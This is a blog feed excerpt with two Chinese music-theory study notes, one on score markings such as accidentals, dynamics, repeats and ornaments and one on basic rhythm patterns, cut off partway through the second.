  
  
  <entry>
    <title>乐理笔记04-乐谱记号</title>
    <link href="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/"/>
    <url>/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/</url>
    
    <content type="html"><![CDATA[<h2 id="乐谱记号"><a href="#乐谱记号" class="headerlink" title="乐谱记号"></a>乐谱记号</h2><h3 id="变音记号"><a href="#变音记号" class="headerlink" title="变音记号"></a>变音记号</h3><p>变音记号一共有五种，除<code>乐理笔记01-基础知识</code>中提到的升号♯、降号♭、重升号𝄪与重降号𝄫外，还有还原号♮，用于取消前面音符的升降变音记号，还原为原来的音。<br>变音记号遵循以下的规则：</p><ul><li>变音记号对“同一小节”内它出现后的所有“同一个音”生效。只管同一个小节，小节外的部分不会变音。</li><li>“同一小节”的“同一个音”出现新的变音记号时，立即以新记号为准。如前面有降号的情况下，后面出现升号，升号及以后的音均要进行升音变音（这里不存在升号与降号相抵消的情况）。</li><li>涉及到延音线跨小节的情况，延音线上的音是同一个音，因此以延音线上最前面的音的升降号为准。延音线后的音与延音线上最前面的音不在同一小节，不会受该升降号影响。</li><li>为方便看谱，很多简谱会将所有需要升降的音全部标注。</li></ul><p>变音记号使用实例（上谱为原谱，下谱表示实际要演奏的音）：<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/1_%E5%8F%98%E9%9F%B3%E8%AE%B0%E5%8F%B7.png" alt="img"></p><h3 id="力度记号"><a href="#力度记号" class="headerlink" title="力度记号"></a>力度记号</h3><table><thead><tr><th align="center">标记</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">pppp</td><td align="center">很弱(pianssimo)</td></tr><tr><td align="center">pp</td><td align="center">弱(piano)</td></tr><tr><td align="center">mpmp</td><td align="center">稍弱(mezzo piano)</td></tr><tr><td align="center">mfmf</td><td align="center">稍强(mezzo forte)</td></tr><tr><td align="center">ff</td><td align="center">强(forte)</td></tr><tr><td align="center">ffff</td><td align="center">很强(fortissimo)</td></tr><tr><td align="center">ffffff</td><td align="center">最强(forte fortissimo)</td></tr><tr><td align="center">cresc.cresc.<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/2_%E6%B8%90%E5%BC%BA.png" alt="img"></td><td align="center">渐强(crescendo)</td></tr><tr><td align="center">dim.dim.<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/2_%E6%B8%90%E5%BC%B1.png" alt="img"></td><td align="center">渐弱(diminuendo)</td></tr><tr><td align="center">sfsf、sfzsfz、fzfz</td><td align="center">突强(sforzando)</td></tr><tr><td align="center">fpfp</td><td align="center">强后突弱(forte piano)</td></tr><tr><td align="center">sfpsfp</td><td align="center">突强后突弱(sforzando piano)</td></tr><tr><td align="center">&gt;&gt;</td><td align="center">重音</td></tr></tbody></table><p>pppp、pp、mpmp、mfmf、ff、ffff、ffffff的作用范围从标有该力度记号的音开始，到下一个力度记号出现为止。</p><h3 id="速度记号"><a href="#速度记号" class="headerlink" title="速度记号"></a>速度记号</h3><table><thead><tr><th align="center">标记</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">rit.rit.、rall.rall.</td><td align="center">渐慢</td></tr><tr><td align="center">accel.accel.</td><td align="center">渐快</td></tr><tr><td align="center">𝄐</td><td align="center">自由延长时值</td></tr></tbody></table><h3 id="反复记号"><a href="#反复记号" class="headerlink" title="反复记号"></a>反复记号</h3><h4 id="反复一次标记间的内容"><a href="#反复一次标记间的内容" class="headerlink" title="反复一次标记间的内容"></a>反复一次标记间的内容</h4><p>前反复记号“𝄆”与后反复记号“𝄇”之间的内容要多重复一遍。<br>前反复记号在乐谱开头时可以省略。<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/3_%E5%8F%8D%E5%A4%8D%E8%AE%B0%E5%8F%B7.png" alt="img"></p><h4 id="跳房子"><a href="#跳房子" class="headerlink" title="跳房子"></a>跳房子</h4><p>第一次进入一房子，第二次进入二房子，以此类推。<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/3_%E8%B7%B3%E6%88%BF%E5%AD%90.png" alt="img"></p><h4 id="从头反复"><a href="#从头反复" class="headerlink" title="从头反复"></a>从头反复</h4><p>D.C.D.C.(Da Capo)回到乐谱开头反复，反复到FineFine处结束。<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/3_%E4%BB%8E%E5%A4%B4%E5%8F%8D%E5%A4%8D01.png" alt="img">D.C.D.C.(Da Capo)回到乐谱开头反复到Da CodaDa Coda，然后跳转到CodaCoda处继续演奏。<br>Coda意为“尾声”，Da CodaDa Coda与CodaCoda均可用符号“𝄌”代替，如下谱所示。<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/3_%E4%BB%8E%E5%A4%B4%E5%8F%8D%E5%A4%8D02.png" alt="img"></p><h4 id="从S处反复"><a href="#从S处反复" class="headerlink" title="从S处反复"></a>从S处反复</h4><p>类似于上文“从头反复”，区别为遇到D.S.D.S.后回到“𝄋”处。<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/3_%E4%BB%8ES%E5%8F%8D%E5%A4%8D01.png" alt="img"></p><h3 id="省略记号"><a href="#省略记号" class="headerlink" title="省略记号"></a>省略记号</h3><h4 id="震音记号"><a href="#震音记号" class="headerlink" title="震音记号"></a>震音记号</h4><p>单音震音：实际演奏音符取决于震音记号有几根线，实际演奏时长为原音符时长。<br>如“<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/4_%E9%9C%87%E9%9F%B300.png" alt="img">”的震音记号有两条线，代表十六分音符，原音符为四分音符，则实际演奏四个十六分音符，即“<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/4_%E9%9C%87%E9%9F%B301.png" alt="img">”<br>再如“<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/4_%E9%9C%87%E9%9F%B302.png" alt="img">”的震音记号有三条线，代表三十二分音符，原音符为八分音符，则实际演奏四个三十二分音符，即“<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/4_%E9%9C%87%E9%9F%B303.png" alt="img">”<br>双音震音：实际演奏音符取决于震音记号有几根线，实际演奏时长为<strong>其中一个</strong>原音符时长。（双音震音中各个原音符时长一致）<br>如“<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/4_%E9%9C%87%E9%9F%B304.png" alt="img">”的震音记号有两条线，代表十六分音符，原音符均为四分音符，则实际演奏四个十六分音符，即“<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/4_%E9%9C%87%E9%9F%B305.png" alt="img">”</p><h4 id="音型反复记号"><a href="#音型反复记号" class="headerlink" title="音型反复记号"></a>音型反复记号</h4><p>用音型反复记号代表重复的音型，音型反复记号的斜线数与原音符下横线数一致（或与其中某个原音符下横线数一致，并不绝对）。<br><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/4_%E5%8F%8D%E5%A4%8D01.png" alt="img"></p><h4 id="小节反复记号"><a href="#小节反复记号" class="headerlink" title="小节反复记号"></a>小节反复记号</h4><p>标在小节内部时表示重复该小节；标在小节线上就是重复两个小节。<br>小节反复记号斜线数量与该小节第一个音符下横线数一致（并不绝对）。<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/4_%E5%8F%8D%E5%A4%8D02.png" alt="img"></p><h3 id="演奏记号"><a href="#演奏记号" class="headerlink" title="演奏记号"></a>演奏记号</h3><h4 id="换气记号"><a href="#换气记号" class="headerlink" title="换气记号"></a>换气记号</h4><p>换气符号为“∨”，标在音符上方，防止一口气唱到底被憋死。</p><h4 id="顿音记号"><a href="#顿音记号" class="headerlink" title="顿音记号"></a>顿音记号</h4><p>顿音记号为“▼”，标在音符上方，唱的时候要有明显停顿感。理论上演奏时长为原音符的四分之一或二分之一时长（并不绝对）。<br>几个连续的顿音记号上画连线时，如“<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/5_%E9%A1%BF%E9%9F%B301.png" alt="img">”。意为“连续的顿音”，唱的时候也要断开但断开的程度较低。理论上演奏时长为原音符的四分之三时长（并不绝对)。</p><h4 id="保持音记号"><a href="#保持音记号" class="headerlink" title="保持音记号"></a>保持音记号</h4><p>顿音记号为“—”，标在音符上方，起强调作用，要求充分保证这个音的演奏时长为该音符时长。（受客观条件所限，演奏某个音时通常达不到其音符规定时长）</p><h4 id="滑音记号"><a href="#滑音记号" class="headerlink" title="滑音记号"></a>滑音记号</h4><p>对于涉及单个音的滑音，上滑音为“↗”，下滑音为“↘”，标在音符两侧。演奏时需要适当的在原有音调基础上平滑地变调，变调的程度自己把握。<br>对于涉及两个音的滑音，上滑音为“𝆱”，下滑音为“𝆲”，标在两个音符中间。要平滑地从一个音符变调到另一个音符。<br>刮奏记号为“<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/6_%E6%BB%91%E9%9F%B301.png" alt="img">”，常见与西洋乐器曲谱中，效果上与滑音相同，强调为实现滑音所做的操作为刮奏。</p><h4 id="琶音记号"><a href="#琶音记号" class="headerlink" title="琶音记号"></a>琶音记号</h4><p>曲谱中同时演奏几个音时，几个音并列标在曲谱同一个位置上，若要使这几个音的演奏有较小的时差时就称为琶音。<br>琶音记号为“𝆃”，此时需要按从下到上的顺序（默认顺序）迅速弹出同一个位置上的音。<br>若要按从上到下顺序弹奏，则使用记号“𝆄”。<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/7_%E7%90%B6%E9%9F%B301.png" alt="img"></p><h3 id="装饰音记号"><a href="#装饰音记号" class="headerlink" title="装饰音记号"></a>装饰音记号</h3><h4 id="理论基础"><a href="#理论基础" class="headerlink" title="理论基础"></a>理论基础</h4><p>级进：忽略升降号，若两个音间没有其他唱名，则前一个音到后一个音称为“级进”。如“1212”、“♭1♯2♭1♯2”可称为向上级进，“1˙71˙7”可称为向下级进。<br>跳进：忽略升降号，若两个音间有其他唱名，则前一个音到后一个音称为“跳进”。如“51˙51˙”可称为向上跳进，“5353”可称为向下跳进。<br>经过音：三个音X、Y、Z，若X级进到Y，Y又级进到Z，且两次级进的方向相同。则称中间的Y为经过音。如“123123”中22为经过音。<br>辅助音：若X级进到Y，Y又反向级进回到到X，两次级进的方向相反，则称Y为辅助音。如“121121”中22为辅助音（先由11向上级进至22，又称为上助音）。同理1˙71˙1˙71˙中77为辅助音（下助音）。<br>跳进级出的助音：X跳进到Y，Y级进到Z，称Y为跳进级出的助音。如“634634”中33为跳进级出的助音。<br>级进跳出的助音：X级进到Y，Y跳进到Z，称Y为级进跳出的助音。如“341341”中44为级进跳出的助音。<br>环绕助音：上助音与下助音同时出现时对其的统称。如“<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/8_%E7%8E%AF%E7%BB%95%E5%8A%A9%E9%9F%B301.png" alt="img">”中66为上助音，44为下助音，同时出现时都可称为环绕助音。<br>辅助音、跳进级出的助音、级进跳出的助音、环绕助音统称为助音。经过音和助音都需要处在弱拍或弱节奏位，否则不能称为经过音或助音。<br><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/8_%E7%BB%8F%E8%BF%87%E9%9F%B301.png" alt="img"></p><h4 id="波音"><a href="#波音" class="headerlink" title="波音"></a>波音</h4><p>弹奏某音较短时间后迅速弹奏该音的临近音（忽略升降号）较短时间，然后恢复弹奏原音。形成波动感，称为波音。</p><table><thead><tr><th align="center">名称</th><th align="center">符号与效果</th></tr></thead><tbody><tr><td align="center">上波音</td><td align="center"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/9_%E6%B3%A2%E9%9F%B301.png" alt="img"></td></tr><tr><td align="center">下波音</td><td align="center"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/9_%E6%B3%A2%E9%9F%B302.png" alt="img"></td></tr><tr><td align="center">复上波音</td><td align="center"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/9_%E6%B3%A2%E9%9F%B303.png" alt="img"></td></tr><tr><td align="center">复下波音</td><td align="center"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/9_%E6%B3%A2%E9%9F%B304.png" alt="img"></td></tr></tbody></table><h4 id="回音"><a href="#回音" class="headerlink" title="回音"></a>回音</h4><p>由四个音或五个音组成的一种旋律型。四个音的顺回音由上助音开始，然后依次为主音、下助音，最后回到主音。四个音的逆回音由下助音开始，然后依次为主音、上助音，最后回到主音。在四个音的回音前加一个主音便是五个音的回音。<br>在回音符号上侧添加变音记号，表示回音上助音为升&#x2F;降音，下侧（下助音）同理。<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/10_%E5%9B%9E%E9%9F%B3.png" alt="img"></p><h4 id="颤音"><a href="#颤音" class="headerlink" title="颤音"></a>颤音</h4><p>由主音与其上助音快速交替而成，交替的频率由演奏者自行把握，总时长足够即可。<br>在颤音符号上侧添加变音记号，表示颤音上助音为升&#x2F;降音。<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/11_%E9%A2%A4%E9%9F%B3.png" alt="img"></p><h4 id="倚音"><a href="#倚音" class="headerlink" title="倚音"></a>倚音</h4><p>倚音在简谱中通常指短倚音，在某个音的前&#x2F;后插入时长很短（可忽略不计）的音称为短倚音。按照插入在音前还是音后可分为前倚音和后倚音。如果插入的音包含多个音符，则可称为复倚音。<br>某个音的后倚音可以看做其后一个音的前倚音。<a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B004-%E4%B9%90%E8%B0%B1%E8%AE%B0%E5%8F%B7/12_%E5%80%9A%E9%9F%B3.png">  </a></p>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
    </categories>
    
    
    <tags>
      
      <tag>钢琴</tag>
      
      <tag>乐理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>乐理笔记03-节奏</title>
    <link href="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/"/>
    <url>/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="基本节奏型"><a href="#基本节奏型" class="headerlink" title="基本节奏型"></a>基本节奏型</h2><p>对四分音符进行拆分，可以得到不同的节奏型，一共有九种。</p><h3 id="四分节奏"><a href="#四分节奏" class="headerlink" title="四分节奏"></a>四分节奏</h3><p>最简单的拆分方式就是不拆分，称为四分节奏型。</p><p><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/0_%E5%9B%9B%E5%88%86%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/0_%E5%9B%9B%E5%88%86%E8%8A%82%E5%A5%8F.png" alt="img"></a></p><h3 id="八分节奏"><a href="#八分节奏" class="headerlink" title="八分节奏"></a>八分节奏</h3><p>把四分音符拆成两个八分音符。</p><p><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/1_%E5%85%AB%E5%88%86%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/1_%E5%85%AB%E5%88%86%E8%8A%82%E5%A5%8F.png" alt="img"></a></p><p>【例】<a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/1_%E5%85%AB%E5%88%86%E8%8A%82%E5%A5%8F01.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/1_%E5%85%AB%E5%88%86%E8%8A%82%E5%A5%8F01.png" alt="img"></a></p><h3 id="十六分节奏"><a href="#十六分节奏" class="headerlink" title="十六分节奏"></a>十六分节奏</h3><p>把四分音符拆成四个八分音符。</p><p><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/2_%E5%8D%81%E5%85%AD%E5%88%86%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/2_%E5%8D%81%E5%85%AD%E5%88%86%E8%8A%82%E5%A5%8F.png" alt="img"></a></p><p>【例】<a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/2_%E5%8D%81%E5%85%AD%E5%88%86%E8%8A%82%E5%A5%8F01.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/2_%E5%8D%81%E5%85%AD%E5%88%86%E8%8A%82%E5%A5%8F01.png" alt="img"></a></p><h3 id="前八后十六节奏"><a href="#前八后十六节奏" class="headerlink" title="前八后十六节奏"></a>前八后十六节奏</h3><p>把四分音符拆成一个八分音符（在前）与两个十六分音符（在后）。</p><p><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/3_%E5%89%8D%E5%85%AB%E5%90%8E%E5%8D%81%E5%85%AD%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/3_%E5%89%8D%E5%85%AB%E5%90%8E%E5%8D%81%E5%85%AD%E8%8A%82%E5%A5%8F.png" alt="img"></a></p><h3 id="前十六后八节奏"><a href="#前十六后八节奏" class="headerlink" title="前十六后八节奏"></a>前十六后八节奏</h3><p>把四分音符拆成一个八分音符（在后）与两个十六分音符（在前）。</p><p><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/4_%E5%89%8D%E5%8D%81%E5%85%AD%E5%90%8E%E5%85%AB%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/4_%E5%89%8D%E5%8D%81%E5%85%AD%E5%90%8E%E5%85%AB%E8%8A%82%E5%A5%8F.png" alt="img"></a></p><p>【例】<a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/4_%E5%89%8D%E5%85%AB%E5%90%8E%E5%8D%81%E5%85%AD%E4%B8%8E%E5%89%8D%E5%8D%81%E5%85%AD%E5%90%8E%E5%85%AB%E8%8A%82%E5%A5%8F01.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/4_%E5%89%8D%E5%85%AB%E5%90%8E%E5%8D%81%E5%85%AD%E4%B8%8E%E5%89%8D%E5%8D%81%E5%85%AD%E5%90%8E%E5%85%AB%E8%8A%82%E5%A5%8F01.png" alt="img"></a></p><h3 id="前八分附点节奏"><a href="#前八分附点节奏" class="headerlink" title="前八分附点节奏"></a>前八分附点节奏</h3><p>把四分音符拆成一个附点八分音符（在前）与一个十六分音符（在后）。</p><p><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/5_%E5%89%8D%E5%85%AB%E5%88%86%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/5_%E5%89%8D%E5%85%AB%E5%88%86%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F.png" alt="img"></a></p><h3 id="后八分附点节奏"><a href="#后八分附点节奏" class="headerlink" title="后八分附点节奏"></a>后八分附点节奏</h3><p>把四分音符拆成一个附点八分音符（在后）与一个十六分音符（在前）。</p><p><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/6_%E5%90%8E%E5%85%AB%E5%88%86%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/6_%E5%90%8E%E5%85%AB%E5%88%86%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F.png" alt="img"></a></p><p>【例】<a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/6_%E5%89%8D%E5%85%AB%E5%88%86%E9%99%84%E7%82%B9%E4%B8%8E%E5%90%8E%E5%85%AB%E5%88%86%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F01.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/6_%E5%89%8D%E5%85%AB%E5%88%86%E9%99%84%E7%82%B9%E4%B8%8E%E5%90%8E%E5%85%AB%E5%88%86%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F01.png" alt="img"></a></p><h3 id="小切分节奏"><a href="#小切分节奏" class="headerlink" title="小切分节奏"></a>小切分节奏</h3><p>把四分音符拆成一个八分音符（在中间）与两个十六分音符（在两侧）。<br>切分改变了音乐中“先强后弱”的强弱关系。中间音符为强音，两侧音符为弱音。</p><p><a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/7_%E5%B0%8F%E5%88%87%E5%88%86%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/7_%E5%B0%8F%E5%88%87%E5%88%86%E8%8A%82%E5%A5%8F.png" alt="img"></a></p><p>【例】<a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/7_%E5%B0%8F%E5%88%87%E5%88%86%E8%8A%82%E5%A5%8F01.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/7_%E5%B0%8F%E5%88%87%E5%88%86%E8%8A%82%E5%A5%8F01.png" alt="img"></a></p><h3 id="三连音"><a href="#三连音" class="headerlink" title="三连音"></a>三连音</h3><p>把四分音符平分成三分。<br>三连音的总拍数代表其下方常规音符拍数的两倍，简称“三代二”。因此四分音符时长的三连音用八分音符作为常规音符表示。<a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/8_%E4%B8%89%E8%BF%9E%E9%9F%B3.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/8_%E4%B8%89%E8%BF%9E%E9%9F%B3.png" alt="img"></a></p><p>【例】<a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/8_%E4%B8%89%E8%BF%9E%E9%9F%B301.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/8_%E4%B8%89%E8%BF%9E%E9%9F%B301.png" alt="img"></a></p><h2 id="节奏型的变体"><a href="#节奏型的变体" class="headerlink" title="节奏型的变体"></a>节奏型的变体</h2><h3 id="大附点及其变体"><a href="#大附点及其变体" class="headerlink" title="大附点及其变体"></a>大附点及其变体</h3><p>将两个四分音符拆成一个附点四分音符与一个八分音符，称为大附点。时长为附点节奏的两倍。<a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/9_%E5%A4%A7%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/9_%E5%A4%A7%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F.png" alt="img"></a></p><p>大附点节奏的一种变体形式是将八分音符替换为两个十六分音符。附点四分音符不能变动。<a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/9_%E5%A4%A7%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F%E5%8F%98%E4%BD%93.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/9_%E5%A4%A7%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F%E5%8F%98%E4%BD%93.png" alt="img"></a></p><p>【例】<a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/9_%E5%A4%A7%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F01.png"><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/9_%E5%A4%A7%E9%99%84%E7%82%B9%E8%8A%82%E5%A5%8F01.png" alt="img"></a></p><h3 id="大切分及其变体"><a href="#大切分及其变体" class="headerlink" title="大切分及其变体"></a>大切分及其变体</h3><p>将两个四分音符拆成一个四分音符（在中间）与两个八分音符（在两侧），称为切分。时长为小切分节奏的两倍。<a href="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B003-%E8%8A%82%E5%A5%8F/10_%E5%A4%A7%E5%88%87%E5%88%86%E8%8A%82%E5%A5%8F.png"><img 